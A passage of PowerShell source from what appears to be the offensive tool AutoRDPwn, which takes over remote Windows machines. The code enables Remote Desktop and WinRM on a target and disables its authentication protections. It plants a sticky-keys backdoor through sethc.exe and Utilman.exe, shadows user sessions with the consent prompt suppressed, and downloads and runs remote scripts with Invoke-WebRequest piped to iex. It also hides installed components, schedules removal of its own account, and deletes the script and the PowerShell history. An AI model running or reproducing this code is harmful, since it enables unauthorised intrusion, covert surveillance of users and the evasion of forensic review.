        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt13" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt14" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt18" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt20" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt1" -ForegroundColor Gray        
        Write-Host ; $Random = New-Object System.Random ; $txt7 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}

        $Host.UI.RawUI.ForegroundColor = 'Green' ; $forwarding = $Host.UI.ReadLine() ; Write-Host
        if($forwarding -like '1') { Write-Host "$txt19" -ForegroundColor Green ; sleep -milliseconds 2500 ; Write-Host ; Write-Host "$txt39" -NoNewLine -ForegroundColor Gray
        $lport = $Host.UI.ReadLine() ; Write-Host ; Write-Host "$txt40" -NoNewLine -ForegroundColor Gray ; $lhost = $Host.UI.ReadLine() ; Write-Host
        Write-Host "$txt41" -NoNewLine -ForegroundColor Gray ; $rport = $Host.UI.ReadLine() ; Write-Host ; Write-Host "$txt42" -NoNewLine -ForegroundColor Gray ; $rhost = $Host.UI.ReadLine()
        netsh interface portproxy add v4tov4 listenport=$lport listenaddress=$lhost connectport=$rport connectaddress=$rhost ; Write-Host "$txt43" -ForegroundColor Green ; sleep -milliseconds 2500 }
        
        if($forwarding -like '2') { Write-Host "$txt19" -ForegroundColor Green ; sleep -milliseconds 2500 ; $proxy = netsh interface portproxy show all
        if(!$proxy){ Write-Host ; Write-Host "$txt44" -ForegroundColor Red ; sleep -milliseconds 4000 } else { $Host.UI.RawUI.ForegroundColor = 'Gray' ; netsh interface portproxy show all ; $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; sleep -milliseconds 2500 }}

        if($forwarding -like '3') { Write-Host "$txt19" -ForegroundColor Green ; sleep -milliseconds 2500 ; $proxy = netsh interface portproxy show all
        if(!$proxy){ Write-Host ; Write-Host "$txt44" -ForegroundColor Red ; sleep -milliseconds 4000 } else { netsh interface portproxy reset ; Write-Host "$txt45" -ForegroundColor Red ; sleep -milliseconds 2500 }}

        if($forwarding -like 'X'){ $input = 'x' ; continue }
        if($forwarding -in '1','2','3','m') { $null } else { Write-Host "$txt5" -ForegroundColor Red ; sleep -milliseconds 4000 }}

        if($module -like '7') { $webserver ="true" ; Write-Host "$txt19" -ForegroundColor Green ; sleep -milliseconds 2500 } 
        if($module -like 'X'){ $input = 'x' ; continue }

	if($module -in '1','2','3','4','5','6','7','m','x') { $null }
        else { Write-Host "$txt5" -ForegroundColor Red ; sleep -milliseconds 4000 }}

        'X' { continue }
        default { Write-Host ; Write-Host "$txt5" -ForegroundColor Red ; sleep -milliseconds 4000 }}} until ($input -in '1','2','3','4','5','6','X')
   
   if($input -in '1','2','3','4','5'){ $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; if($hash){ echo "AutoRDPwn" > credentials.dat
   $user = type credentials.dat ; $password = type credentials.dat | ConvertTo-SecureString -AsPlainText -Force ; del credentials.dat }
   $Host.UI.RawUI.ForegroundColor = 'Green' ; winrm quickconfig -quiet ; Set-Item wsman:\localhost\client\trustedhosts * -Force
   Set-NetConnectionProfile -InterfaceAlias "Ethernet*" -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias "Wi-Fi*" -NetworkCategory Private
   Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LocalAccountTokenFilterPolicy -Value 1 -Type DWord 2>&1> $null
   $credential = New-Object System.Management.Automation.PSCredential ( $user, $password ) ; $RDP = New-PSSession -Computer $computer -credential $credential
   $session = get-pssession ; if ($session){ 

        do { $Host.UI.RawUI.ForegroundColor = 'Green'
	if ($stickykeys){ $input = "control" } else { Write-Host ; Write-Host "$txt27" -NoNewLine -ForegroundColor Gray ; $input = $Host.UI.ReadLine() }
        switch -wildcard ($input) {

        'ver' { $control = "false" ; Write-Host
	invoke-command -session $RDP[0] -scriptblock { REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 4 /f 2>&1> $null 
	Write-Host "$using:txt28" -ForegroundColor Blue }}

        'see' { $control = "false" ; Write-Host  
	invoke-command -session $RDP[0] -scriptblock { REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 4 /f 2>&1> $null 
	Write-Host "$using:txt28" -ForegroundColor Blue }}

        'control*' { $control = "true" ; Write-Host 
	invoke-command -session $RDP[0] -scriptblock { REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f 2>&1> $null 
	Write-Host "$using:txt29" -ForegroundColor Blue }}

        default { Write-Host ; Write-Host "$txt5" -ForegroundColor Red ; sleep -milliseconds 4000 }}} until ($input -in 'ver','see','controlar','control')

    invoke-command -session $RDP[0] -scriptblock {
    REG ADD "HKLM\SOFTWARE\Microsoft\WBEM\CIMOM" /v AllowAnonymousCallback /t REG_DWORD /d 1 /f 2>&1> $null
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f 2>&1> $null
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v AutoShareWks /t REG_DWORD /d 1 /f 2>&1> $null
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v AutoShareServer /t REG_DWORD /d 1 /f 2>&1> $null
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v AllowRemoteRPC /t REG_DWORD /d 1 /f 2>&1> $null
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f 2>&1> $null
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Remote Assistance" /v fAllowToGetHelp /t REG_DWORD /d 1 /f 2>&1> $null
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Remote Assistance" /v fAllowFullControl /t REG_DWORD /d 1 /f 2>&1> $null }
    Write-Host ; Write-Host "$txt30" -ForegroundColor Blue ; $hostname = invoke-command -session $RDP[0] -scriptblock {(systeminfo | findstr /I "host" | select -First 1).split(':')[1].trim()}
    Write-Host ; Write-Host "$txt31" -NoNewLine ; Write-Host $hostname.tolower() -ForegroundColor Gray
    $version = invoke-command -session $RDP[0] -scriptblock {(systeminfo | findstr "Microsoft Windows" | select -First 1).split(':')[1].trim()} ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host

    if ($stickykeys){ invoke-command -session $RDP[0] -scriptblock { 
    REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "cmd /k cmd" /f 2>&1> $null
    REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Utilman.exe" /v Debugger /t REG_SZ /d "cmd /k cmd" /f 2>&1> $null
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f 2>&1> $null
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f 2>&1> $null }}

        if($version -Like '*Server*') { Write-Host "$version $txt32" -ForegroundColor Red
        invoke-command -session $RDP[0] -scriptblock { $Host.UI.RawUI.ForegroundColor = 'Green'
        (Get-WmiObject -class Win32_TSGeneralSetting -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0) 2>&1> $null
        Write-Host ; Write-Host "$using:txt33" -ForegroundColor Blue ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; query session } 
        $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; Write-Host "$txt34" -NoNewLine -ForegroundColor Gray ; $shadow = $Host.UI.ReadLine()
        if($control -eq 'true') { if($stickykeys){ mstsc /v $computer /admin /f } else { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }}
        else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}

        else { Write-Host "$version $txt35" -ForegroundColor Red
        invoke-command -session $RDP[0] -scriptblock {
        add-type @"
        using System.Net;
        using System.Security.Cryptography.X509Certificates;
        public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
        ServicePoint srvPoint, X509Certificate certificate,
        WebRequest request, int certificateProblem) { return true; }}
"@;     $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
        [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols
        [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy }

    invoke-command -session $RDP[0] -scriptblock { 
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-RDPwrap.ps1" -UseBasicParsing | iex
    msiexec /i "RDPWInst-v1.6.2.msi" /quiet /qn /norestart ; netsh advfirewall firewall delete rule name="$using:Pwn10" 2>&1> $null
    netsh advfirewall firewall add rule name="$using:Pwn10" dir=in protocol=udp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 2>&1> $null
    netsh advfirewall firewall add rule name="$using:Pwn10" dir=in protocol=tcp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 2>&1> $null
    attrib +h 'C:\Program Files\RDP Wrapper' 2>&1> $null ; attrib +h 'C:\Program Files (x86)\RDP Wrapper' 2>&1> $null ; sleep -milliseconds 7500 ; rm .\RDPWInst-v1.6.2.msi 2>&1> $null } 
    
    $shadow = invoke-command -session $RDP[0] -scriptblock {(Get-Process explorer | Select-Object SessionId | Format-List | findstr "Id" | select -First 1).split(':')[1].trim()}
    $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; Write-Host "$txt33" -ForegroundColor Blue ; sleep -milliseconds 2500
    if($control -eq 'true') { if($stickykeys){ mstsc /v $computer /admin /f } else { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }}
    else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}

if ($hash){ invoke-command -session $RDP[0] -scriptblock { 
$script = 'net user AutoRDPwn /delete ; Remove-Item -path C:\Users\AutoRDPwn* -Recurse -Force ; Unregister-ScheduledTask -TaskName AutoRDPwn -Confirm:$false ; $PScript = $MyInvocation.MyCommand.Definition ; Remove-Item $PScript'
echo $script > $env:TEMP\script.ps1 ; $file = "$env:TEMP\script.ps1"
$action = New-ScheduledTaskAction -Execute powershell -Argument "-ExecutionPolicy ByPass -NoProfile -WindowStyle Hidden $file" ; $time = (Get-Date).AddHours(+2) ; $trigger =  New-ScheduledTaskTrigger -Once -At $time
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "AutoRDPwn" -Description "AutoRDPwn" -TaskPath Microsoft\Windows\Powershell\ScheduledJobs -User "System" > $null }}

Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host $txt36  -ForegroundColor Red ; sleep -milliseconds 4000 
if ($webserver){ invoke-command -session $RDP[0] -scriptblock { netsh advfirewall firewall delete rule name="Powershell Webserver" 2>&1> $null
netsh advfirewall firewall add rule name="Powershell Webserver" dir=in action=allow protocol=TCP localport=8080 2>&1> $null ; Write-Host
Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray
Write-Host "Powershell Web Server -->` " -NoNewLine -ForegroundColor Green ; Write-Host http://$using:computer`:8080 -ForegroundColor Blue 
Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray ; sleep -milliseconds 7500
start powershell { Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Start-WebServer.ps1 -UseBasicParsing | iex }}}

if ($console){ $PlainTextPassword = ConvertFrom-SecureToPlain $password ; Clear-Host ; Write-Host ">> $txt37 <<" ; Write-Host ; WinRS -r:$computer -u:$user -p:$PlainTextPassword "cmd" }}
else { Write-Host ; Write-Host "$txt38" -ForegroundColor Red ; sleep -milliseconds 4000 }} if($tsfail) { Write-Host ; Write-Host "$txt38" -ForegroundColor Red ; sleep -milliseconds 4000 }}
$PScript = $MyInvocation.MyCommand.Definition ; Remove-Item $PScript ; del (Get-PSReadlineOption).HistorySavePath
